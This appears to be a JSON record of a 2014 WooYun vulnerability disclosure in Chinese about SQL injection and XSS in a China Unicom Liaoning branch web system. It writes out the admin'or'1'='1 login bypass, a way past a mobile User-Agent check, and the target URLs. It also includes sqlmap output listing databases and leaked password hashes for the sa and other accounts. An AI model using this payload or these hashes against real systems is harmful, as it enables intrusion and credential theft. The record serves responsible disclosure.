{"id": 661, "wybug_id": "wooyun-2014-074604", "wybug_title": "中国联通某省分公司网络保管系统存在SQL注射和XSS漏洞[二]-目测80-90万用户", "wybug_corp": "中国联通", "wybug_author": "cf_hb", "wybug_date": "2014-09-01 10:57", "wybug_open_date": "2014-10-16 11:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述： 越来越觉得网络都是不安全的了！！我的重要的资料肯定不会放在网络上的-[暂时是这么觉得] 详细说明：  厂商版权：中国联合网络通信有限公司 辽宁省分公司域名：www.ln10060.com有图有真相：\n\n先看看效果图：\n\n大连分公司\n\n辽宁分公司\n\n锦州分公司\n\n沈阳分公司:\n\n用同样的方法: admin'or'1'='1 万能钥匙登陆其他分公司\n\n目测了一下有个人企业用户80-90万的样子！！！问：进去个人移动管理端是啥子样子呢？？？答：请看图说话\n\n那不是账号密码吗？？明文的登陆手机客户端访问的URL：这里需要一点技巧，因为它判断了是不是从移动设备登陆的，不是的话就会跳回到首页。这里它根据UserAgent判断的，用Js做判断跳转。我是这样绕开的：\n\nbp自动放行，响应包里正则匹配处理了那js判断的逻辑。让它恒为真。。然后我只需要用代理，不拦截自动放行就可以想移动设备一样正常登陆使用。于是。。。\n\n\n\n\n\n问：进入web个人管理端又是啥子样子呢？答：再看图说话\n\n\n\n\n\n\n\n\n\n看到好多重要信息啊。。嘿嘿。。。。好激动的说。。。测试一个XSS：编辑短信珍藏：\n\n\n\n打开个性分类：\n\nSQL注入证明：http://www.ln10060.com/phone/login.jsphttp://www.ln10060.com/manager/抓包sqlmap测试结果：back-end DBMS: Microsoft SQL Server 2000[09:36:32] [INFO] fetching database names[09:36:35] [INFO] the SQL query used returns 8 entries[09:36:35] [INFO] starting 8 threads[09:36:36] [INFO] retrieved: \"wo\"[09:36:36] [INFO] retrieved: \"pubs\"[09:36:36] [INFO] retrieved: \"master\"[09:36:36] [INFO] retrieved: \"ymaildb\"[09:36:36] [INFO] retrieved: \"msdb\"[09:36:36] [INFO] retrieved: \"Northwind\"[09:36:36] [INFO] retrieved: \"tempdb\"[09:36:36] [INFO] retrieved: \"model\"available databases [8]:[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] wo[*] ymaildbdatabase management system users [4]:[*] BUILTIN\\\\Administrators[*] sa[*] wodb[*] ymaildb[09:38:17] [INFO] the back-end DBMS is Microsoft SQL Serverback-end DBMS: Microsoft SQL Server 2000[09:38:17] [INFO] fetching current usercurrent user:    'ymaildb'[09:38:17] [INFO] fetching current databasecurrent database:    'ymaildb'数据库密码哈希值：database management system users password hashes:[*] BUILTIN\\\\Administrators [2]:    password hash: NULL    password hash: \\n[*] sa [1]:    password hash: 0x0100003b0f1146dbb61a589d977ddcf316031dee7b5d6469d6cec535a0ef2a83211425dde7230c5a041748ffce03        header: 0x0100        salt: 003b0f11        mixedcase: 46dbb61a589d977ddcf316031dee7b5d6469d6ce        uppercase: c535a0ef2a83211425dde7230c5a041748ffce03[*] wodb [1]:    password hash: 0x01000525f658da3f2c7d73123afa088a4a3b5f06b654f17d146f49d2e35041d0b0e50c8d584b376b0e82ffe03781        header: 0x0100        salt: 0525f658        mixedcase: da3f2c7d73123afa088a4a3b5f06b654f17d146f        uppercase: 49d2e35041d0b0e50c8d584b376b0e82ffe03781[*] ymaildb [1]:    password hash: 0x0100892df33f9a11fc24e056389133ee4f812c38534906be36722257d3a836ac8444caa8e4e9055649936c965cee        header: 0x0100        salt: 892df33f        mixedcase: 9a11fc24e056389133ee4f812c38534906be3672        uppercase: 2257d3a836ac8444caa8e4e9055649936c965cee当前数据库表：\n\n测试注出数据：\n\n看数据很慢，不过有了数据库用户hash爆破了直接连上去简单多了！！好了！我把所有测试都表述在这里了！！问题很严重啊,望相关厂商赶紧修复！   漏洞证明：  请看上面！   修复方案：  严灰常灰常严格的过滤用户输入参数！   版权声明：转载请注明来源 cf_hb@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-09-06 09:02 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-01 11:12 |    \t\tcf_hb \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:17        | 爱生活，爱安全！)\t\t \n   十多分钟 就审核过了，好激动的说！！    \n     2014-09-01 17:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  唉。。。互联网扒光了你的衣服    \n     2014-10-16 16:19 |    \t\t小卖部部长 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        | 别拿部长不当干部！)\t\t \n  楼主真腻害啊~~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}